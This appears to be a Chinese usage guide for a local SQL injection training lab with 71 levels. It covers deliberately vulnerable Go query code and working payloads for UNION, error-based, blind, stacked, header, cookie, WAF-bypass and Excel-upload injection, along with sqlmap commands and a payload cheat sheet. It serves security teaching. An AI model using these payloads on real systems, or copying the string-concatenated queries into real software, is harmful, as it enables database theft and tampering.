# 使用说明

本文档面向安全学习者，逐一讲解 Go SQLi Lab 71 个关卡（Less-1 ~ Less-71）的漏洞类型与利用方法。所有说明均与 [`src/vulnerabilities/`](../src/vulnerabilities/) 的实际实现一一对应。

> ⚠️ **安全提示**：本靶场仅供本地学习与研究，请勿对未授权目标使用文中任何手法。

---

## 0. 总览

### 0.1 关卡地图

| 分类 | 关卡 | 注入入口 | 核心技巧 |
|------|------|---------|---------|
| 基础挑战 | Less-1 ~ Less-10 | GET `id` | 报错注入 / UNION / 布尔盲注 / 时间盲注 |
| POST 与 Header | Less-11 ~ Less-22 | POST 表单、Cookie、UA/Referer 头 | 登录绕过、UPDATE/INSERT 注入、Base64 Cookie |
| WAF 绕过 | Less-23 ~ Less-37 | GET `id`、POST、注册接口 | 注释/关键字/空格过滤绕过、addslashes、二次注入 |
| 堆叠与子句注入 | Less-38 ~ Less-53 | GET `id`、POST、GET `sort` | 堆叠语法、ORDER BY、LIMIT 注入 |
| 挑战关卡 | Less-54 ~ Less-65 | 多样化入口 | challenge1~12 表综合挑战 |
| 文件导出注入 | Less-66 ~ Less-69 | GET `keyword` | LIKE 子句注入 + XLS/XLSX 导出 |
| 文件上传注入 | Less-70 ~ Less-71 | 上传 Excel 文件 | 单元格内容批量注入 |

### 0.2 环境与数据准备

- 首次使用：`go run src/main.go --setup-db`（或访问 `/setup-db`）初始化数据库。
- 数据被注入改乱后：点击首页右上角「🔄 重置数据库」，或 `POST /api/reset-db` 还原。
- **挑战关卡注意**：`challenge1~12` 的数据只在“重置数据库”流程中注入（见第 5 章），`--setup-db` 仅建表不插挑战数据 —— 首次练习挑战关卡前请先重置一次。
- 种子数据（`users` 表，8 条）：`Dumb/Dumb`、`Angelina/I-kill-you`、`Dummy/p@ssword`、`secure/crappy`、`stupid/stupidity`、`superman/genious`、`batman/mob!le`、`admin/admin`。

### 0.3 数据库差异须知（重要）

| 能力 | SQLite（默认） | MySQL | PostgreSQL |
|------|---------------|-------|-----------|
| 版本函数 | `sqlite_version()` | `version()` | `version()` |
| 字符串聚合 | `group_concat(col)` | `group_concat(col)` | `string_agg(col, ',')` |
| 延时函数 | **无** `SLEEP` | `SLEEP(n)` | `pg_sleep(n)` |
| 注释符 | `-- `、`/* */`（`#` 无效） | `-- `、`#`、`/* */` | `-- `、`/* */` |
| 报错注入函数 | 无 `extractvalue/updatexml` | `extractvalue/updatexml`（5.x） | 无 |

时间盲注类关卡（Less-9/10/56）在 **SQLite 下没有 `SLEEP()` 函数可用**，页面固定输出同一内容；真正的延时对比需切换到 MySQL / PostgreSQL 后端。Less-9/10 的响应头会带 `X-Response-Time`，可用 `curl -i` 观察查询耗时差异作为替代参考。

---

## 1. 基础挑战（Less-1 ~ Less-10，GET 注入）

### 1.1 Less-1：Error Based - String（字符型报错注入）

SQL 拼接形态（[less1.go](../src/vulnerabilities/less1.go)）：

```go
query := fmt.Sprintf("SELECT * FROM users WHERE id='%s' LIMIT 1 OFFSET 0", id)
```

利用步骤：

1. **注入点探测**——加单引号触发语法错误，页面直接回显数据库错误（报错注入特征）：

```text
http://localhost:8080/less/less-1?id=1'
```

2. **确认列数**——用 `ORDER BY` 递增探测（users 表共 3 列，`ORDER BY 4` 时报错）：

```text
http://localhost:8080/less/less-1?id=1' ORDER BY 3-- -
```

3. **UNION 注入**——闭合单引号并注释掉尾部 `LIMIT`；让原查询无结果、UNION 行成为首行，页面即输出第 2、3 列内容（显示为 "Your Login name / Your Password"）：

```text
http://localhost:8080/less/less-1?id=99' UNION SELECT 1,2,3-- -
http://localhost:8080/less/less-1?id=99' UNION SELECT 1,username,password FROM users-- -
```

> URL 中的空格与 `-- -` 会被浏览器/服务器按需编码（curl 可用 `--data-urlencode` 或手动 `%20`）。GET 方式下 Chrome 会自动把空格转成 `%20`，直接粘贴即可。

### 1.2 Less-2：Error Based - Integer（数字型）

```go
query := fmt.Sprintf("SELECT * FROM users WHERE id=%s LIMIT 1 OFFSET 0", id)   // 无引号
```

无需闭合引号：

```text
http://localhost:8080/less/less-2?id=99 UNION SELECT 1,2,3
http://localhost:8080/less/less-2?id=1 AND 1=1
```

### 1.3 Less-3 / Less-7 / Less-62：括号闭合类

- **Less-3**：`WHERE id=('%s')` —— 先闭合右括号再加注释：

```text
http://localhost:8080/less/less-3?id=99') UNION SELECT 1,2,3-- -
```

- **Less-7**：`WHERE id=(('%s'))`（双括号，关卡名为 "Dump into outfile"，SQLite 等不支持 `INTO OUTFILE`，Go 实现按普通字符型注入输出用户数据）：

```text
http://localhost:8080/less/less-7?id=99')) UNION SELECT 1,2,3-- -
```

- **Less-62**（挑战表 `challenge9`）：同样双括号闭合。

### 1.4 Less-4 / Less-6 / Less-10：双引号类

- **Less-4**：`WHERE id=("%s")` —— 闭合双引号：

```text
http://localhost:8080/less/less-4?id=99") UNION SELECT 1,2,3-- -
```

- **Less-6**（双查询注入·双引号）：SQL 为 `id="%s"`，与 Less-5 同款无回显逻辑（见 1.5），页面不回显数据行。
- **Less-10**（时间盲注·双引号）：见 1.6。

### 1.5 Less-5 / Less-6：无回显报错型（"You are in"）

实现特点（[less5.go](../src/vulnerabilities/less5.go) 单引号 `id='%s'` / [less6.go](../src/vulnerabilities/less6.go) 双引号 `id="%s"`）：查询成功后页面**不回显数据行**，仅输出固定文案 `You are in...........`。

> 关键细节：SQL 能正常执行时——**无论命中 1 行还是 0 行**（如 `AND '1'='2'` 条件为假）——页面都会显示该文案；只有注入破坏 SQL 语法/语义时才回显数据库错误原文。因此**不要用“文案有无”做布尔盲注**，应利用“是否报错”这一通道：

```text
# 正常闭合 → You are in
http://localhost:8080/less/less-5?id=1' AND '1'='1'-- -
# 语法破坏 → 页面回显 SQL 错误（确认注入点）
http://localhost:8080/less/less-5?id=1' AND (SELECT 1 FROM users-- -
```

- **MySQL 后端（推荐）**：本关经典玩法是把数据带进报错信息 —— `extractvalue` / `updatexml`（5.x）：

```text
# Less-5（单引号）：报错信息直接带出全部用户名
http://localhost:8080/less/less-5?id=1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username) FROM users)))-- -
# Less-6（双引号）：带出 admin 密码
http://localhost:8080/less/less-6?id=1" AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))-- -
```

- 也可自构造“条件真 → 运行时错误 / 条件假 → 正常”的错误二元通道（配合 CASE 与类型转换/非法调用，因数据库而异）；SQLite 后端此关偏重**报错注入特征观察**，数据提取可切到 MySQL 练习。

### 1.6 Less-8：布尔盲注（Boolean Based）

实现特点（[less8.go](../src/vulnerabilities/less8.go)）：SQL 出错时**吞掉一切错误信息**（页面空白），仅查询成功时输出 "You are in..........."。因此以文案作为布尔条件的结果：

```text
# 条件为真 → You are in...........
http://localhost:8080/less/less-8?id=1' AND '1'='1

# 条件为假 → 空白（只有标题）
http://localhost:8080/less/less-8?id=1' AND '1'='2
```

手工逐字符猜解（配合 `curl` + 输出判断）：

```bash
# 猜解 admin 密码第 1 个字符是否为 'a'（substr 三库通用）
curl "http://localhost:8080/less/less-8?id=1' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -"
# MySQL 也可用 substring(...)
# 响应含 "You are in" 即命中
```

### 1.7 Less-9 / Less-10：时间盲注（Time Based）

实现特点：页面**任何请求都输出同样文案**，只能靠**响应时间**区分。响应头带 `X-Response-Time`。

- 默认 SQLite：无 `SLEEP()`。可验证注入点的语法闭合（`1' AND '1'='1` 与 `1' AND '1'='2` 响应耗时不同）或观察 `X-Response-Time` 头。
- 切到 **MySQL** 后可实际延时：

```text
# 条件为真时延时 3 秒（单引号版 Less-9）
http://localhost:8080/less/less-9?id=1' AND SLEEP(3)-- -

# 双引号版 Less-10
http://localhost:8080/less/less-10?id=1" AND SLEEP(3)-- -
```

- 切到 **PostgreSQL** 用 `pg_sleep`：`1' AND pg_sleep(3)-- -`

```bash
# 用 curl 计时验证
time curl "http://localhost:8080/less/less-9?id=1' AND SLEEP(3)-- -"
```

---

## 2. POST 登录 / UPDATE / Header / Cookie 注入（Less-11 ~ Less-22）

### 2.1 Less-11 ~ Less-14：POST 登录型报错注入

表单字段统一为 `uname` / `passwd`（[less11.go](../src/vulnerabilities/less11.go)）：

```go
query := fmt.Sprintf("SELECT username, password FROM users WHERE username='%s' and password='%s' LIMIT 1 OFFSET 0", uname, passwd)
```

```bash
# Less-11 字符型登录绕过
curl -X POST "http://localhost:8080/less/less-11" -d "uname=admin' OR '1'='1&passwd=x"

# Less-11 报错探测
curl -X POST "http://localhost:8080/less/less-11" -d "uname=admin'&passwd=x"
```

- **Less-12**：双引号包裹，用 `admin" OR "1"="1`（注意 MySQL 默认 `"` 是字符串；SQLite 同样支持双引号字符串字面量）。
- **Less-13 / Less-14**：登录成功与否不回显数据（同双查询形态，输出提示），用文案与报错判断。SQL 分别带 `('...')` 与 `("...")` 括号包裹，需先闭合括号。
- 响应中登录成功会显示 "Your Login name / Your Password"（如 `admin' OR '1'='1` 会取到 users 表中与条件匹配的首行 admin 记录）。

### 2.2 Less-15 / Less-16：POST 盲注

登录失败与 SQL 错误**都不显示错误细节**，只能靠登录反馈区分，利用方式同 Less-8/布尔盲注（PostgreSQL 等延时函数亦可用于 POST 场景）：

```bash
curl -X POST "http://localhost:8080/less/less-15" -d "uname=admin' AND '1'='1&passwd=x"   # 登录成功文案
curl -X POST "http://localhost:8080/less/less-15" -d "uname=admin' AND '1'='2&passwd=x"   # 失败
```

### 2.3 Less-17：UPDATE 语句注入（密码重置场景）

实现特点（[less17.go](../src/vulnerabilities/less17.go)）：先按 `username` 查用户（该查询同样拼接），存在后再执行：

```go
updateQuery := fmt.Sprintf("UPDATE users SET password='%s' WHERE username='%s'", password, username)
```

利用点 1——**username 处报错注入**（先闭合字符串）：

```bash
# 用户名闭合单引号 → 恒真 → 命中 admin，随后可把 admin 密码改为 123456
curl -X POST "http://localhost:8080/less/less-17" -d "username=admin' OR '1'='1&password=123456"
```

利用点 2——**password 处注入扩展 UPDATE**（一次改多行 / 子查询，MySQL 支持 `password=1, ...`）：

```bash
# 把整表密码改成被控值
curl -X POST "http://localhost:8080/less/less-17" -d "username=admin&password=hacked' WHERE '1'='1"
```

> 该关会真实改写 `users` 表，练习后请重置数据库。

### 2.4 Less-18 / Less-19：请求头注入（INSERT 场景）

模拟"登录后把 User-Agent / Referer 记入日志"的业务。**登录校验是真实的**（需有效凭据：`admin/admin` 或种子用户），漏洞点在登录成功后的 INSERT：

```go
// Less-18（[less18.go](../src/vulnerabilities/less18.go)）
insertQuery := fmt.Sprintf("INSERT INTO uagents (uagent, ip_address, username) VALUES ('%s', '%s', '%s')", uagent, ip, uname)
```

```bash
# Less-18：正常登录 + 注入 User-Agent 头
curl -X POST "http://localhost:8080/less/less-18" \
  -H "User-Agent: Mozilla/5.0', '1.2.3.4', 'admin'); -- " \
  -d "uname=admin&passwd=admin"

# 更直白的报错注入：UA 中放单引号 → INSERT 语法错误回显
curl -X POST "http://localhost:8080/less/less-18" -H "User-Agent: '" -d "uname=admin&passwd=admin"
```

- **Less-19**：入口相同，注入点在 `Referer` 头（[less19.go](../src/vulnerabilities/less19.go) 的 INSERT 写入 `referers` 表）。
- 提示：HTTP 头不能直接出现换行/空格敏感字符时用 curl 的 `-H` 完整控制；单引号闭合参考 `('payload')` 结构逐层补齐。
- 该场景数据写入 `uagents`/`referers` 表，重置后清空。

### 2.5 Less-20 ~ Less-22：Cookie 注入

- **Less-20**：登录成功后下发明文 `uname` Cookie；携带 Cookie 时服务端直接拼接查询（[less20.go](../src/vulnerabilities/less20.go)）：

```text
# 先用 admin/admin 登录取 Cookie，再修改 Cookie 值触发注入
Cookie: uname=admin' OR '1'='1
Cookie: uname=99' UNION SELECT 1,username,password FROM users-- -
```

```bash
curl -b "uname=admin' OR '1'='1" "http://localhost:8080/less/less-20"
```

- **Less-21 / Less-22**：Cookie 值需 **Base64 编码**后才被拼接（[less21.go](../src/vulnerabilities/less21.go) 先 `base64.StdEncoding.DecodeString`）。注入前先对 payload 编码：

```bash
# payload: admin' OR '1'='1
# base64:  YWRtaW4nIE9SICcxJz0nMQ==
curl -b "uname=YWRtaW4nIE9SICcxJz0nMQ==" "http://localhost:8080/less/less-21"

# 也可直接 GET（解码后走同一查询）
```

Less-22 为双引号包裹：payload `admin" OR "1"="1` → Base64：`YWRtaW4iIE9SICcxJz0nMQ==`。

---

## 3. WAF 绕过专题（Less-23 ~ Less-37）

各关卡真实过滤规则以源码为准，汇总如下：

| 关卡 | 过滤/防护模拟 | 绕过思路 |
|------|--------------|---------|
| Less-23 | 删除 `--`、`#`、`/*`、`*/`（[less23.go](../src/vulnerabilities/less23.go)） | 无注释可用时用**等价条件**闭合：`id=1' AND '1'='1` |
| Less-24 | 无字符过滤（二次注入主题） | 注册接口 INSERT 注入 + 二次利用 |
| Less-25 | 删除 `OR`/`or`/`AND`/`and`（[less25.go](../src/vulnerabilities/less25.go)） | 运算符替代 `||`、`&&`；**双写** `OORR`、`ANANDD` 绕过（删除后还原为 OR/AND） |
| Less-26 | 删除空格与全部注释符 | 用 `%0a`(换行)、`%09`(TAB)、`/**/` 无法用→用括号/运算符组合；SQLite 也可用 `%0A` 间隔关键字 |
| Less-27 | 删除 `UNION`/`SELECT`（大小写各一，[less27.go](../src/vulnerabilities/less27.go)） | **大小写混淆** `UnIoN SeLeCt`（删除逻辑只匹配小写与全大写）、`UNION ALL` 双写 |
| Less-28 | 无实际过滤（语义演示关） | 直接按 Less-1 方式利用 |
| Less-29/30/31 | 无实际过滤（WAF1/2/3 语义演示关） | 直接按字符型 UNION 利用 |
| Less-32 | 模拟 `addslashes()`：转义 `'` `"` `\`（[less32.go](../src/vulnerabilities/less32.go)） | 转义发生在 Go 层且目标多为 SQLite，`\` 不作为转义符，可尝试 `1'||'1'='1` 等；MySQL 经典宽字节 `%df%27` 需 GBK 字符集，本项目 MySQL DSN 固定 utf8mb4 故不可复现——重点理解防护原理 |
| Less-33 | 无实际过滤（UTF-8 语义演示关） | 直接利用 |
| Less-34/35 | 无实际过滤（POST/整数变体语义演示） | 直接利用（POST 登录 / 无引号整数） |
| Less-36/37 | 无实际过滤（mysql_real_escape_string 语义演示） | 直接利用 |

### 3.1 Less-23：注释符被过滤

```text
# 直接 UNION（注释被删会失败）：
http://localhost:8080/less/less-23?id=1' UNION SELECT 1,2,3-- -

# 利用尾部单引号配对，不用注释（经典写法）：
http://localhost:8080/less/less-23?id=1' AND '1'='1
http://localhost:8080/less/less-23?id=99' UNION SELECT 1,2,3 AND '1'='1
```

### 3.2 Less-25：OR/AND 被过滤

```text
# || 逻辑或绕过
http://localhost:8080/less/less-25?id=1' || '1'='1

# 双写绕过（删除 OORR 中的 OR 后还原成 OR）
http://localhost:8080/less/less-25?id=1' OORR '1'='1
```

### 3.3 Less-26：空格与注释被过滤

```text
# 用 %0A（换行）替代空格分隔关键字（注意 URL 编码）
http://localhost:8080/less/less-26?id=1'%0AOR%0A'1'='1
# MySQL 下还可用 %09(TAB)、%0B、%0C；SQLite 对 %0A 支持良好
```

### 3.4 Less-27：UNION/SELECT 被过滤

```text
# 大小写混合绕过（过滤仅匹配 UNION/union、SELECT/select）
http://localhost:8080/less/less-27?id=99' UnIoN SeLeCt 1,2,3-- -
```

### 3.5 Less-24：二次注入（Second Order）

实现特点（[less24.go](../src/vulnerabilities/less24.go)）：提供"创建新用户"（INSERT 拼接漏洞）与登录入口。注册时用户名/密码直接拼接入库，若把**注入语句存入数据库**，后续逻辑再次读取该值并拼接 SQL 即构成二次注入。当前实现练习方式：

1. 访问 <http://localhost:8080/less/less-24> → 「创建新用户」；
2. 注册名注入报错探测（INSERT 语句回显错误）：

```bash
curl -X POST "http://localhost:8080/less/less-24/new_user" -d "username=admin'&password=x"
```

3. 将 `username` 构造为合法 INSERT 中可执行的注入串（如闭合引号改写后续字段、或借错误回显探测结构），观察是否污染了 `users` 表；重置数据库可还原。

### 3.6 Less-32：addslashes() 模拟

```go
// addslashes：把 ' " \ 前缀反斜杠
func addslashes(s string) string { ... }
```

SQLite 不使用反斜杠转义（`''` 才是字符串内引号转义），因此注入点在转义后仍可能通过**配对拼接**利用；MySQL 后端则按"转义字符"思路练习绕过（宽字节手法见上表）。

---

## 4. 堆叠查询与子句注入（Less-38 ~ Less-53）

### 4.1 Less-38 ~ Less-45：堆叠查询（Stacked Queries）

实现说明：关卡 SQL 结构为 `SELECT ... WHERE id='%s'`，**注入点在 WHERE 值处**。Go 的 `database/sql` 默认单语句执行：SQLite 驱动只编译首条语句，MySQL 驱动默认未开启 `multiStatements`。因此：

- **语法练习**：构造 `'; ... -- -` 形式观察尾随语句是否执行/报错，理解"分号堆叠"语法；
- **实际多语句执行**：MySQL 后端需在 DSN 追加 `multiStatements=true`（本项目的 `db.New` 固定拼接 DSN，可自行修改配置或直接改写驱动 DSN 实验，不建议生产使用）。

各关形态：

- Less-38（GET 字符型）、Less-39（GET 数字型）、Less-40（GET 盲注形态）、Less-41（数字盲注形态）、Less-42（POST 登录，字段 `login_user`/`login_password`）、Less-43（POST 数字型）、Less-44（POST 报错形态）、Less-45（POST 盲注形态）。

POST 堆叠示例（Less-42）：

```bash
curl -X POST "http://localhost:8080/less/less-42" \
  --data-urlencode "login_user=admin' ; UPDATE users SET password='pwned' WHERE username='admin' -- -" \
  -d "login_password=x"
```

### 4.2 Less-46 ~ Less-52：ORDER BY 注入

实现特点（[less46.go](../src/vulnerabilities/less46.go)）：参数为 `sort`，**直接拼接进 ORDER BY 子句**，结果以表格输出全部用户：

```go
query := fmt.Sprintf("SELECT * FROM users ORDER BY %s", sort)
```

基础利用：

```text
# 数字排序 / 按列名排序 / 多列排序（正常功能）
http://localhost:8080/less/less-46?sort=1
http://localhost:8080/less/less-46?sort=username

# 注入报错探测
http://localhost:8080/less/less-46?sort=1'                # 语法错误（若关卡拼接引号）
http://localhost:8080/less/less-46?sort=(SELECT 1)        # 子查询可用性

# 盲注猜解（条件为真按 id 排序，为假按 password 排序 → 首行不同）
http://localhost:8080/less/less-46?sort=id,(SELECT CASE WHEN substr(sqlite_version(),1,1)='3' THEN 1 ELSE 2 END)
```

系列差异（文件名/形态决定利用方式，均可直接参考对应源码）：
- Less-46（报错回显，无引号）、Less-47（单引号包裹，需闭合）、Less-48（盲注，无错误回显）、Less-49（盲注 + 引号闭合）、Less-50（数字型）、Less-51（引号闭合 + 报错回显）、Less-52（分号堆叠形态）。

### 4.3 Less-53：LIMIT 子句注入

实现特点（[less53.go](../src/vulnerabilities/less53.go)）：

```go
query := fmt.Sprintf("SELECT * FROM users LIMIT 1 OFFSET %s", id)
```

注入点在 `OFFSET` 后的数字处（无法 UNION，LIMIT 之后不接子句）。可验证注入并观察偏移：

```text
http://localhost:8080/less/less-53?id=0      # 正常：Dumb
http://localhost:8080/less/less-53?id=1      # 正常：Angelina
http://localhost:8080/less/less-53?id=2-1    # 算术注入：结果等同 id=1
http://localhost:8080/less/less-53?id=1'     # 语法错误回显
```

MySQL 5.x 还有经典的 `PROCEDURE ANALYSE()` 报错注入（`1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)`），SQLite/新版 MySQL 不可用。

---

## 5. 挑战关卡（Less-54 ~ Less-65）

每关对应独立数据表 `challenge1` ~ `challenge12`，其余与主线关卡同构，适合综合练习。

> 挑战数据来源（重要）：这些表**不随 `--setup-db` 填充**，而是在「重置数据库」流程中由 `seedChallenges()` 注入 —— 每表按编号插入 `3 + 表号 % 3` 条记录（共 3~5 条，用户名形如 `challenge_user1`、密码 `pass1`）。首次进入本章前请先重置一次数据库（见 [0.2](#02-环境与数据准备)）。

| 关卡 | 表 | 形态 | 速通思路 |
|------|----|------|---------|
| Less-54 | challenge1 | UNION 挑战 | `?id=99' UNION SELECT 1,2,3-- -` |
| Less-55 | challenge2 | 括号数字型 `id=(%s)` | 闭合右括号：`?id=99) UNION SELECT 1,2,3-- -`（盲注思路通用） |
| Less-56 | challenge3 | 时间盲注 | MySQL `SLEEP` / PG `pg_sleep` |
| Less-57 | challenge4 | 布尔盲注 | 文案有无判定 |
| Less-58 | challenge5 | 堆叠挑战 | 分号语法实验 |
| Less-59 | challenge6 | WAF（屏蔽 `union/select/sleep/benchmark`，大小写不敏感，[less59.go](../src/vulnerabilities/less59.go)） | `UNION ALL`? 不行——按**注释/空白混淆**思路：`UN/**/ION` ？代码用 `strings.Contains` 子串检测，`un/**/ion` 不含 `union` 子串即可绕过（取决于驱动对注释的支持）；或改用布尔盲注完全不触发关键字 |
| Less-60 | challenge7 | JSON 参数注入（[less60.go](../src/vulnerabilities/less60.go)） | 参数以 JSON 提交（POST JSON body 或 `?data={"id":"..."}`），单引号被删除、无引号拼接 → 数字型注入 |

```bash
# Less-60：JSON 参数注入示例（数字型，无引号拼接）
curl -X POST "http://localhost:8080/less/less-60" \
  -H "Content-Type: application/json" \
  -d '{"id":"99 UNION SELECT 1,2,3"}'

# Less-60 也可 GET 提交 JSON 字符串
curl "http://localhost:8080/less/less-60?data=%7B%22id%22%3A%2299%20UNION%20SELECT%201%2C2%2C3%22%7D"
```

| 关卡 | 表 | 形态 | 速通思路 |
|------|----|------|---------|
| Less-61 | challenge8 | 纯整数（`'` `"` 均被删除） | 无引号注入：`?id=99 UNION SELECT 1,2,3` |
| Less-62 | challenge9 | 双括号包裹 | `?id=99')) UNION SELECT 1,2,3-- -` |
| Less-63 | challenge10 | 整数盲注 | `?id=1 AND 1=1` vs `AND 1=2` |
| Less-64 | challenge11 | Cookie 挑战 | 注入点位于 `id` Cookie（首次访问自动 `Set-Cookie: id=1`）：`curl -H "Cookie: id=99' UNION SELECT 1,2,3-- -" ...` |
| Less-65 | challenge12 | User-Agent 挑战（[less65.go](../src/vulnerabilities/less65.go)） | ⚠️ **已知缺陷**：SQL 按 `ua` 列过滤（`WHERE ua='%s'`），但 `challenge12` 表只有 `id/username/password` 三列（见 [db.go](../src/db/db.go) Migrate）——任何 UA 都会报 `no such column: ua`，当前版本**无法完成利用**，仅可观察报错注入特征，待修复 |

---

## 6. 文件导出注入（Less-66 ~ Less-69）

### 6.1 场景与原理

模拟后台管理系统的"按关键字搜索并导出 Excel"功能（[export.go](../src/vulnerabilities/export.go)、[resume_export.go](../src/vulnerabilities/resume_export.go)）：

```go
// Less-66/67 目标 users 表；Less-68/69 目标 resumes（简历，20 个字段）
rawSQL = fmt.Sprintf("SELECT id, username, password FROM users WHERE username LIKE '%%%s%%'", keyword)
```

页面提供：**预览查询结果**（回显执行的 SQL 与表格/错误）与 **导出文件** 两个入口：

| 关卡 | 导出格式 | 数据来源 |
|------|---------|---------|
| Less-66 | XLS（HTML 兼容格式，Excel 可打开） | `users` |
| Less-67 | XLSX（标准 OOXML） | `users` |
| Less-68 | XLS（"应聘人员求职登记表"版式） | `resumes`（6 条中文种子数据，如 张伟/李娜） |
| Less-69 | XLSX（模板驱动，excelize 填充） | `resumes` |

### 6.2 利用步骤

1. 打开关卡页（如 <http://localhost:8080/less/less-67>），在 `keyword` 输入 `张` 或 `admin` 预览正常查询；
2. **报错探测**：keyword 输入 `'` → 页面回显 SQL 错误与完整 SQL；
3. **UNION 注入**（把结果导出进文件/表格，直观看到脱库数据）：

```text
# users 表（3 列）——SQLite/MySQL
keyword = %' UNION SELECT 1,group_concat(username),3 FROM users-- -
# PostgreSQL 版
keyword = %' UNION SELECT 1,string_agg(username,','),3 FROM users-- -

# resumes 表（20 列）——SQLite/MySQL
keyword = %' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM resumes-- -
```

4. **盲注**：`admin' AND 1=1-- -` 与 `admin' AND 1=2-- -` 的结果行数对比（导出文件中可见）。

```bash
# 注入并直接下载 XLSX 导出文件
curl -o users.xlsx "http://localhost:8080/less/less-67/export?keyword=%25'%20UNION%20SELECT%201,group_concat(username),3%20FROM%20users--%20-"
```

> 直接浏览器访问导出 URL（带 payload）也可触发下载。`%` 通配符在 URL 中需编码为 `%25`。

---

## 7. 文件上传注入（Less-70 ~ Less-71）

### 7.1 场景与原理

模拟"批量导入用户名做验证"的功能（[upload.go](../src/vulnerabilities/upload.go)）：上传 Excel 后，后端解析**第一个 Sheet**，跳过表头行，把**每行第一列作为 keyword** 逐行执行与导出关同款的 LIKE 拼接查询，并把每行的 SQL 与结果（成功行数 / 报错）回显到页面。

| 关卡 | 上传格式 | 解析库 |
|------|---------|--------|
| Less-70 | `.xls`（二进制格式） | extrame/xls（纯 Go） |
| Less-71 | `.xlsx` | excelize |

### 7.2 利用步骤

1. 进入关卡页 → 点「📥 下载模板」（`/less/less-70/template`），模板首行是表头 `username`，下面两行示例数据；
2. 用 **Excel/WPS 打开模板**（XLS 模板是真正的二进制 .xls，XLSX 模板为标准 .xlsx），把第二行单元格改成注入 payload，保存；
3. 上传（POST `/less/less-70/upload`，multipart 字段名 `file`，≤10MB），页面逐行展示：执行的 SQL → 命中的行（或错误）。

模板单元格 payload 示例（每行第一列一个）：

| 行 | 第一列内容 | 效果 |
|----|-----------|------|
| 2 | `'` | 报错注入：该行 SQL 报错回显 |
| 3 | `%' UNION SELECT 1,group_concat(username),3 FROM users-- -` | 该行查询回显全部用户名（SQLite/MySQL） |
| 4 | `admin' AND 1=1-- -` | 布尔盲注对比行（与 `1=2` 行结果数不同） |

```bash
# 命令行上传
curl -F "file=@payload.xlsx" http://localhost:8080/less/less-71/upload
```

> **注意**：`.xls` 文件必须是真正的二进制 XLS（Excel 97-2003 另存或模板直接改），**不能**把文本/HTML 改名成 `.xls`——extrame/xls 只解析二进制 OLE 格式，否则页面提示解析失败。

---

## 8. 工具辅助注入示例（sqlmap）

靶场首页/API 返回的关卡信息可用 sqlmap 快速验证（只针对本靶场）：

```bash
# GET 字符型（Less-1）
sqlmap -u "http://localhost:8080/less/less-1?id=1" --dbs --batch

# POST 登录型（Less-11）
sqlmap -u "http://localhost:8080/less/less-11" --data "uname=admin&passwd=x" --level 2 --dbs --batch

# Cookie 注入（Less-20，先手动登录取 uname）
sqlmap -u "http://localhost:8080/less/less-20" --cookie "uname=admin" --level 2 --dbs --batch

# 导出/上传关的 LIKE 场景（Less-67）
sqlmap -u "http://localhost:8080/less/less-67" --data "keyword=admin" --dbs --batch
```

> 时间盲注与导出/上传注入场景受数据库类型影响，切换 MySQL/PostgreSQL 后端后 sqlmap 效果最佳。

---

## 9. 通用 Payload 速查

### 报错探测

```text
'        "        ')       ")      '))      "))      )        \
1'       1"       1')      1")     1'))     1"))
```

### UNION 探测列数（逐级递增）

```text
' ORDER BY 1-- -   ...   ' ORDER BY 5-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### 布尔盲注模板（SQLite / 通用）

```text
id=1' AND '1'='1
id=1' AND '1'='2
id=1' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

### 时间盲注（MySQL）

```text
id=1' AND SLEEP(3)-- -
id=1' AND IF(ascii(substr(database(),1,1))>100,SLEEP(3),0)-- -
```

### 注释写法

```text
-- -      # 空格 + 注释（标准，PostgreSQL 要求 -- 后必须有空格）
--+       # MySQL 特化（+ 变空格）
#         # MySQL 专用（SQLite 无效）
/* */     # 内联注释（可藏关键字：UN/**/ION）
```

---

## 10. 其他功能

### 10.1 数据库重置

| 方式 | 入口 |
|------|------|
| 命令行 | `go run src/main.go --setup-db`（仅初始化，不清数据） |
| 页面 | 首页右上角「🔄 重置数据库」→ `/loading` 进度页 → `/setup-success` |
| 页面（兼容旧版） | `GET /setup-db?reset=true` |
| API | `POST /api/reset-db`（返回 JSON：`success/clearedTables/insertedRecords/executionTime`） |

### 10.2 关卡列表 API

```bash
curl http://localhost:8080/api/vulnerabilities            # 全部 71 关（id/name/description/category）
curl http://localhost:8080/api/vulnerabilities/less-71    # 单关详情
curl http://localhost:8080/health                          # 健康检查
curl http://localhost:8080/api/db-status                   # 数据库连接状态
```

### 10.3 请求记录

每个关卡的请求（时间、方法、URL、查询参数）都会以追加方式写入 `tmp/<lesson>/result.txt`（GET 入口类）或 `tmp/<lesson>-create`（部分写操作），便于回看自己构造的 payload：

```bash
tail -f tmp/less-1/result.txt
```

### 10.4 日志

结构化日志输出到 `logs/app.log`（lumberjack 滚动，默认 100MB×10 份、保留 30 天），HTTP 请求级访问日志与业务日志均在此：

```bash
tail -f logs/app.log
```

---

## 11. 学习路径建议

1. **入门**：Less-1 → Less-4（报错/UNION）→ Less-11 → Less-17（POST 与写操作）
2. **盲注进阶**：Less-8（布尔）→ Less-9（时间，建议切 MySQL）→ Less-15/16
3. **WAF 绕过**：Less-23 → Less-25 → Less-26 → Less-27 → Less-32
4. **子句与堆叠**：Less-46 → Less-53 → Less-38/42
5. **综合挑战**：Less-54 → Less-64（倒序做难度递增；Less-65 为已知缺陷关，见第 5 章说明）
6. **业务场景**：Less-66/67（导出）→ Less-68/69（简历导出）→ Less-70/71（上传批量验证）

每关完成后建议「重置数据库」，保持环境干净可复现。
